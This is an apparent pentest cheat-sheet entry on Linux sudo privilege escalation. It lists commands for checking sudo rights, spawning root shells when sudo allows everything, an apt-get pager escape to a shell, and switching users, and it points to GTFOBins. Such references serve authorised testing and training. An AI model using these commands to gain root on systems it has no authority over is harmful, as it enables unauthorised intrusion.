---
title: Sudo Privilege Abuse
category: privesc
subcategory: linux-privesc
os: linux
command: sudo -l
tools: sudo, gtfobins
---


### Check current sudo permissions

```bash
sudo -l
```

### Easy abuse cases

When `(ALL : ALL) ALL`:

```bash
sudo -s
sudo bash -i
sudo sh -c "bash -i"
sudo su root
```

### apt-get example

```bash
sudo apt-get changelog apt
!/bin/sh
```

### Become another user

```bash
sudo -i -u <username>
```

### Reference

For binary-specific abuse paths see https://gtfobins.github.io/.
